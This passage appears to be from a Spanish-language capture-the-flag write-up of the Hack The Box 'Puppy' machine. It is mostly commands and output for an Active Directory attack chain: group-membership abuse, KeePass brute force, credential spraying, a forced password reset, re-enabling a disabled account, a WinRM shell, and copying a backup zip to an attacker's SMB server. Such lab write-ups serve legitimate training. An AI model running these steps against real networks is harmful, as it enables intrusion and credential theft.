+</span></span></code></pre></div><p>Ahora nos conectamos a la carpeta compartida DEV pero vemos que no tenemos ningún tipo de permiso:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ smbclient <span class="se">\\\\</span>10.10.11.70<span class="se">\\</span>DEV -U PUPPY.HTB<span class="se">\\</span>levi.james
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>PUPPY.HTB<span class="se">\l</span>evi.james<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> dir
+</span></span><span class="line"><span class="cl">NT_STATUS_ACCESS_DENIED listing <span class="se">\*</span>
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
+</span></span><span class="line"><span class="cl">NT_STATUS_ACCESS_DENIED listing <span class="se">\*</span>
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> get
+</span></span><span class="line"><span class="cl">get &lt;filename&gt; <span class="o">[</span>localname<span class="o">]</span>
+</span></span></code></pre></div><p>Procedemos a hacer un escaneo con bloodhound usando las credenciales del usuario levi.james.</p>
+<h1 id="enumeración-con-bloodhound">Enumeración con bloodhound<a hidden class="anchor" aria-hidden="true" href="#enumeración-con-bloodhound">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodhound-python -u levi.james -p <span class="s1">&#39;KingofAkron2025!&#39;</span> -d PUPPY.HTB -ns 10.10.11.70 -c all --zip
+</span></span></code></pre></div><h2 id="abusando-de-privilegios-genericwrite---bloodyad-o-net-rpc">Abusando de privilegios GenericWrite - BloodyAD o Net Rpc<a hidden class="anchor" aria-hidden="true" href="#abusando-de-privilegios-genericwrite---bloodyad-o-net-rpc">#</a></h2>
+<p><img alt="Puppy Machine 1" loading="lazy" src="/img/puppy/puppy_machine_1.png"></p>
+<p>Vemos que levi.james es miembro del grupo HR, y el grupo HR tiene permisos <code>GenericWrite</code> sobre el grupo DEVELOPERS. Con lo cual vamos a añadir al usuario levi.james al grupo de DEVELOPERS mediante <code>bloodyAD</code> o <code>net rpc</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u <span class="s1">&#39;levi.james&#39;</span> -p <span class="s1">&#39;KingofAkron2025!&#39;</span> add groupMember <span class="s1">&#39;DEVELOPERS&#39;</span> <span class="s1">&#39;levi.james&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> levi.james added to DEVELOPERS
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ net rpc group addmem <span class="s2">&#34;DEVELOPERS&#34;</span> <span class="s2">&#34;levi.james&#34;</span> -U <span class="s2">&#34;PUPPY.HTB&#34;</span>/<span class="s2">&#34;levi.james&#34;</span>%<span class="s1">&#39;KingofAkron2025!&#39;</span> -S <span class="s2">&#34;10.10.11.70&#34;</span>
+</span></span></code></pre></div><blockquote>
+<p>Ponemos entre comillas simples la contraseña ya que contiene caracteres especiales como &ldquo;!&rdquo;</p>
+</blockquote>
+<p>Ahora que ya hemos añadido al usuario levi.james vamos a comprobar si tenemos permisos sobre la carpeta compartida DEV con <code>nxc</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.70 -u <span class="s1">&#39;levi.james&#39;</span> -p <span class="s1">&#39;KingofAkron2025!&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:PUPPY.HTB<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>+<span class="o">]</span> PUPPY.HTB<span class="se">\l</span>evi.james:KingofAkron2025!
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC Share Permissions Remark
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC ----- ----------- ------
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC ADMIN$ Remote Admin
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC C$ Default share
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC DEV READ DEV-SHARE <span class="k">for</span> PUPPY-DEVS
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC IPC$ READ Remote IPC
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC NETLOGON READ Logon server share
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC SYSVOL READ Logon server share
+</span></span></code></pre></div><p>Vemos que ahora si que tenemos permisos de lectura y nos conectamos a la carpeta compartida con <code>smbclient</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ smbclient <span class="se">\\\\</span>10.10.11.70<span class="se">\\</span>DEV -U PUPPY.HTB<span class="se">\\</span>levi.james
+</span></span><span class="line"><span class="cl">Can<span class="err">&#39;</span>t load /etc/samba/smb.conf - run testparm to debug it
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>PUPPY.HTB<span class="se">\l</span>evi.james<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
+</span></span><span class="line"><span class="cl">. DR <span class="m">0</span> Sun Mar <span class="m">23</span> 08:07:57 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">.. D <span class="m">0</span> Sat Mar <span class="m">8</span> 17:52:57 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">KeePassXC-2.7.9-Win64.msi A <span class="m">34394112</span> Sun Mar <span class="m">23</span> 08:09:12 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">Projects D <span class="m">0</span> Sat Mar <span class="m">8</span> 17:53:36 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">recovery.kdbx A <span class="m">2677</span> Wed Mar <span class="m">12</span> 03:25:46 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl"><span class="m">5080575</span> blocks of size 4096. <span class="m">1646472</span> blocks available
+</span></span></code></pre></div><p>Tenemos un archivo .kdbk que es un archivo que almacena credenciales de forma segura y normalmente requiere una contraseña o un archivo clave (keyfile).</p>
+<p><img alt="Puppy Machine 2" loading="lazy" src="/img/puppy/puppy_machine_2.png"></p>
+<p>Como no tenemos la contraseña ni nada parecido vamos a intentar extraer el hash con keepass2jhon y luego crackearlo pero no nos funciona.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ keepass2john recovery.kdbx
+</span></span><span class="line"><span class="cl">! recovery.kdbx : File version <span class="s1">&#39;40000&#39;</span> is currently not supported!
+</span></span></code></pre></div><h2 id="ataque-por-fuerza-bruta-al-archivo-kdbx---keepass4brute">Ataque por fuerza bruta al archivo .kdbx - Keepass4brute<a hidden class="anchor" aria-hidden="true" href="#ataque-por-fuerza-bruta-al-archivo-kdbx---keepass4brute">#</a></h2>
+<p>Vamos a probar un ataque por fuerza bruta con keepass4brute.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ /opt/Herramientas/keepass4brute/keepass4brute.sh recovery.kdbx /usr/share/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt
+</span></span><span class="line"><span class="cl">keepass4brute 1.3 by r3nt0n
+</span></span><span class="line"><span class="cl">https://github.com/r3nt0n/keepass4brute
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Words tested: 345/1000000 - Attempts per minute: <span class="m">113</span> - Estimated <span class="nb">time</span> remaining: <span class="m">6</span> days, <span class="m">3</span> hours
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current attempt: liverpool
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Password found: liverpool
+</span></span></code></pre></div><p>Vemos que nos encuentra una coincidencia con la contraseña &ldquo;liverpool&rdquo; con lo cual vamos a volver abrir el archivo con keepassxc para comprobar que sea válida.</p>
+<p><img alt="Puppy Machine 3" loading="lazy" src="/img/puppy/puppy_machine_3.png"></p>
+<p>Ahora que tenemos una lista con unas credenciales vamos a comprobar las credenciales con la lista de usuarios sacada anteriormente con nxc.</p>
+<h2 id="comprobación-de-credenciales-con-nxc">Comprobación de credenciales con nxc<a hidden class="anchor" aria-hidden="true" href="#comprobación-de-credenciales-con-nxc">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.70 -u <span class="s1">&#39;users&#39;</span> -p <span class="s1">&#39;passwords&#39;</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:PUPPY.HTB<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>-<span class="o">]</span> PUPPY.HTB<span class="se">\A</span>dministrator:JamieLove2025! STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>-<span class="o">]</span> PUPPY.HTB<span class="se">\G</span>uest:JamieLove2025! STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>-<span class="o">]</span> PUPPY.HTB<span class="se">\k</span>rbtgt:Antman2025! STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>-<span class="o">]</span> PUPPY.HTB<span class="se">\l</span>evi.james:Antman2025! STATUS_LOGON_FAILURE
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>+<span class="o">]</span> PUPPY.HTB<span class="se">\a</span>nt.edwards:Antman2025!
+</span></span></code></pre></div><p>Ahora que tenemos nuevas credenciales disponibles vamos a volver a mirar el bloodhound para ver que clase de permisos tiene.</p>
+<p>Enumerando los permisos que tiene el usuario ant.edwards vemos que es miembro de SENIOR DEVS que a la vez tiene permisos <code>GenericAll</code> sobre adam.silver.</p>
+<p><img alt="Puppy Machine 4" loading="lazy" src="/img/puppy/puppy_machine_4.png"></p>
+<h2 id="kerberoast-attack-failed">Kerberoast attack [FAILED]<a hidden class="anchor" aria-hidden="true" href="#kerberoast-attack-failed">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo ntpdate -u 10.10.11.70
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> contraseña para borhub:
+</span></span><span class="line"><span class="cl"><span class="m">3</span> Jun 23:52:00 ntpdate<span class="o">[</span>10694<span class="o">]</span>: adjust <span class="nb">time</span> server 10.10.11.70 offset -0.003879 sec
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ /opt/Herramientas/targetedKerberoast/targetedKerberoast.py --dc-ip 10.10.11.70 -d <span class="s1">&#39;PUPPY.HTB&#39;</span> -u <span class="s1">&#39;ant.edwards&#39;</span> -p <span class="s1">&#39;Antman2025!&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting kerberoast attacks
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Fetching usernames from Active Directory with LDAP
+</span></span></code></pre></div><h2 id="shadow-credential-attack-failed">Shadow Credential Attack [FAILED]<a hidden class="anchor" aria-hidden="true" href="#shadow-credential-attack-failed">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ /opt/Herramientas/pywhisker/pywhisker.py --dc-ip 10.10.11.70 -d <span class="s1">&#39;PUPPY.HTB&#39;</span> -u <span class="s1">&#39;ant.edwards&#39;</span> -p <span class="s1">&#39;Antman2025!&#39;</span> --target <span class="s2">&#34;adam.silver&#34;</span> --action <span class="s2">&#34;add&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Searching <span class="k">for</span> the target account
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Target user found: <span class="nv">CN</span><span class="o">=</span>Adam D. Silver,CN<span class="o">=</span>Users,DC<span class="o">=</span>PUPPY,DC<span class="o">=</span>HTB
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generating certificate
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate generated
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Generating KeyCredential
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> KeyCredential generated with DeviceID: 50d01920-0320-e928-73a2-9d3796ebeaf4
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Updating the msDS-KeyCredentialLink attribute of adam.silver
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Updated the msDS-KeyCredentialLink attribute of the target object
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Converting PEM -&gt; PFX with cryptography: DM4pfjWo.pfx
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> PFX exportiert nach: DM4pfjWo.pfx
+</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> Passwort für PFX: ARoPYbPOSeV621UmpShy
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Saved PFX <span class="o">(</span><span class="c1">#PKCS12) certificate &amp; key at path: DM4pfjWo.pfx</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Must be used with password: ARoPYbPOSeV621UmpShy
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+</span></span></code></pre></div><p>Intentamos ahora con gettgtpkini obtener el TGT pero nos da el siguiente error:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ /opt/Herramientas/PKINITtools/gettgtpkinit.py -cert-pfx DM4pfjWo.pfx -pfx-pass <span class="s1">&#39;ARoPYbPOSeV621UmpShy&#39;</span> PUPPY.HTB/adam.silver adam.silver.ccache -dc-ip 10.10.11.70
+</span></span><span class="line"><span class="cl">2025-06-04 00:15:27,177 minikerberos INFO Loading certificate and key from file
+</span></span><span class="line"><span class="cl">INFO:minikerberos:Loading certificate and key from file
+</span></span><span class="line"><span class="cl">2025-06-04 00:15:27,195 minikerberos INFO Requesting TGT
+</span></span><span class="line"><span class="cl">INFO:minikerberos:Requesting TGT
+</span></span><span class="line"><span class="cl">Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">File <span class="s2">&#34;/opt/Herramientas/PKINITtools/gettgtpkinit.py&#34;</span>, line 349, in &lt;module&gt;
+</span></span><span class="line"><span class="cl">main<span class="o">()</span>
+</span></span><span class="line"><span class="cl">~~~~^^
+</span></span><span class="line"><span class="cl">File <span class="s2">&#34;/opt/Herramientas/PKINITtools/gettgtpkinit.py&#34;</span>, line 345, in main
+</span></span><span class="line"><span class="cl">amain<span class="o">(</span>args<span class="o">)</span>
+</span></span><span class="line"><span class="cl">~~~~~^^^^^^
+</span></span><span class="line"><span class="cl">File <span class="s2">&#34;/opt/Herramientas/PKINITtools/gettgtpkinit.py&#34;</span>, line 315, in amain
+</span></span><span class="line"><span class="cl"><span class="nv">res</span> <span class="o">=</span> sock.sendrecv<span class="o">(</span>req<span class="o">)</span>
+</span></span><span class="line"><span class="cl">File <span class="s2">&#34;/home/borhub/Entornos-Pentesting/pentest-venv/lib/python3.13/site-packages/minikerberos/network/clientsocket.py&#34;</span>, line 85, in sendrecv
+</span></span><span class="line"><span class="cl">raise KerberosError<span class="o">(</span>krb_message<span class="o">)</span>
+</span></span><span class="line"><span class="cl">minikerberos.protocol.errors.KerberosError: Error Name: KDC_ERR_CLIENT_REVOKED Detail: <span class="s2">&#34;Client’s credentials have been revoked&#34;</span>
+</span></span></code></pre></div><blockquote>
+<p>This might be because of an explicit disabling or because of other restrictions in place on the account. For example: account disabled, expired, or locked out.</p>
+</blockquote>
+<h2 id="force-change-password---net-rpc">Force Change Password - Net rpc<a hidden class="anchor" aria-hidden="true" href="#force-change-password---net-rpc">#</a></h2>
+<p>Cambiamos contraseña usuario adam.silver - Net rpc</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ net rpc password <span class="s2">&#34;adam.silver&#34;</span> <span class="s1">&#39;micontrafavorita2025!&#39;</span> -U <span class="s2">&#34;PUPPY.HTB&#34;</span>/<span class="s2">&#34;ant.edwards&#34;</span>%<span class="s1">&#39;Antman2025!&#39;</span> -S <span class="s2">&#34;10.10.11.70&#34;</span>
+</span></span></code></pre></div><p>Intentamos abrir una shell remota y obtenemos un código de error:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ evil-winrm -u adam.silver -p micontraseñafavorita2025! -i 10.10.11.70
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="s1">&#39;quoting_detection_proc&#39;</span> <span class="k">for</span> module Reline
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">Error: An error of <span class="nb">type</span> WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+</span></span><span class="line"><span class="cl">Error: Exiting with code <span class="m">1</span>
+</span></span></code></pre></div><p>Entonces vamos a comprobar con nxc las credenciales y vemos que el estado de la cuenta esta DESHABILITADA. (También lo podríamos haber visto en el bloodhound pero yo no me di cuenta)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.70 -u <span class="s1">&#39;adam.silver&#39;</span> -p <span class="s1">&#39;micontraseñafavorita2025!&#39;</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:PUPPY.HTB<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>-<span class="o">]</span> PUPPY.HTB<span class="se">\a</span>dam.silver:micontraseñafavorita2025! STATUS_ACCOUNT_DISABLED
+</span></span></code></pre></div><h2 id="deshabilitar-accountdisable---bloodyad">Deshabilitar ACCOUNTDISABLE - BloodyAD<a hidden class="anchor" aria-hidden="true" href="#deshabilitar-accountdisable---bloodyad">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u <span class="s1">&#39;ant.edwards&#39;</span> -p <span class="s1">&#39;Antman2025!&#39;</span> remove uac <span class="s1">&#39;adam.silver&#39;</span> -f ACCOUNTDISABLE
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> <span class="o">[</span><span class="s1">&#39;ACCOUNTDISABLE&#39;</span><span class="o">]</span> property flags removed from adam.silver<span class="err">&#39;</span>s userAccountControl
+</span></span></code></pre></div><p>Una vez quitada la flag ACCOUNTDISABLE volvemos a probar con nxc winrm y nos indica que todo ha ido correctamente.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc winrm 10.10.11.70 -u <span class="s1">&#39;adam.silver&#39;</span> -p <span class="s1">&#39;micontraseñafavorita2025!&#39;</span>
+</span></span><span class="line"><span class="cl">WINRM 10.10.11.70 <span class="m">5985</span> DC <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:PUPPY.HTB<span class="o">)</span>
+</span></span><span class="line"><span class="cl">WINRM 10.10.11.70 <span class="m">5985</span> DC <span class="o">[</span>+<span class="o">]</span> PUPPY.HTB<span class="se">\a</span>dam.silver:micontraseñafavorita2025! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</span></span></code></pre></div><p>Entonces nos creamos una shell con evil-winrm.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ evil-winrm -i 10.10.11.70 -u adam.silver -p <span class="s1">&#39;micontrafavorita2025!&#39;</span>
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="s1">&#39;quoting_detection_proc&#39;</span> <span class="k">for</span> module Reline
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dam.silver<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ../Desktop/user.txt
+</span></span><span class="line"><span class="cl">58e2e43ead7d8708ec72dba552fe0e25
+</span></span></code></pre></div><h1 id="movimiento-lateral">Movimiento lateral<a hidden class="anchor" aria-hidden="true" href="#movimiento-lateral">#</a></h1>
+<p>Una vez tenemos nuestra shell con el usuario adam.silver nos ponemos a enumerar el sistema manualmente. En C:/ nos encontramos la carpeta Backups que dentro tiene un archivo .zip llamado site-backup-2024-12-30.zip, que nos los descargamos a nuestra máquina atacante para enumerarlo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> ls
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Directory: C:<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>Mode LastWriteTime Length Name
+</span></span><span class="line"><span class="cl">---- ------------- ------ ----
+</span></span><span class="line"><span class="cl">d----- 5/9/2025 10:48 AM Backups
+</span></span><span class="line"><span class="cl">d----- 5/12/2025 5:21 PM inetpub
+</span></span><span class="line"><span class="cl">d----- 5/8/2021 1:20 AM PerfLogs
+</span></span><span class="line"><span class="cl">d-r--- 4/4/2025 3:40 PM Program Files
+</span></span><span class="line"><span class="cl">d----- 5/8/2021 2:40 AM Program Files <span class="o">(</span>x86<span class="o">)</span>
+</span></span><span class="line"><span class="cl">d----- 3/8/2025 9:00 AM StorageReports
+</span></span><span class="line"><span class="cl">d-r--- 3/8/2025 8:52 AM Users
+</span></span><span class="line"><span class="cl">d----- 5/13/2025 4:40 PM Windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> <span class="nb">cd</span> Backups
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\B</span>ackups&gt; ls
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Directory: C:<span class="se">\B</span>ackups
+</span></span><span class="line"><span class="cl">Mode LastWriteTime Length Name
+</span></span><span class="line"><span class="cl">---- ------------- ------ ----
+</span></span><span class="line"><span class="cl">-a---- 3/8/2025 8:22 AM <span class="m">4639546</span> site-backup-2024-12-30.zip
+</span></span></code></pre></div><h2 id="descarga-de-archivos-con-smb-server">Descarga de archivos con smb server<a hidden class="anchor" aria-hidden="true" href="#descarga-de-archivos-con-smb-server">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo smbserver.py smbFolder <span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span> -smb2support
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> contraseña para borhub:
+</span></span><span class="line"><span class="cl">/usr/lib/python3.13/site-packages/impacket/version.py:10: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span class="k">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span class="line"><span class="cl">import pkg_resources
+</span></span><span class="line"><span class="cl">Impacket v0.11.0 - Copyright <span class="m">2023</span> Fortra
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Incoming connection <span class="o">(</span>10.10.11.70,62080<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>DC<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> User DC<span class="se">\ </span>authenticated successfully
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC$<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC$<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Disconnecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Closing down connection <span class="o">(</span>10.10.11.70,62080<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Remaining connections <span class="o">[]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\B</span>ackups&gt; copy C:<span class="se">\B</span>ackups<span class="se">\s</span>ite-backup-2024-12-30.zip <span class="se">\\</span>10.10.15.254<span class="se">\s</span>mbFolder<span class="se">\
+</span></span></span></code></pre></div><h2 id="leak-information">Leak Information<a hidden class="anchor" aria-hidden="true" href="#leak-information">#</a></h2>
+<p>Una vez tenemos el archivo en nuestra máquina lo descomprimimos y enumeramos.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ unzip site-backup-2024-12-30.zip
+</span></span></code></pre></div><p><img alt="Puppy Machine 5" loading="lazy" src="/img/puppy/puppy_machine_5.png"></p>
+<p>Descubrimos las credenciales del usuario steph.cooper, anteriormente en la enumeración de usuarios vimos que steph tenia el usuario normal y el usuario adm. Tratamos de obtener una shell con ambos pero solo la conseguimos con el usuario normal.</p>
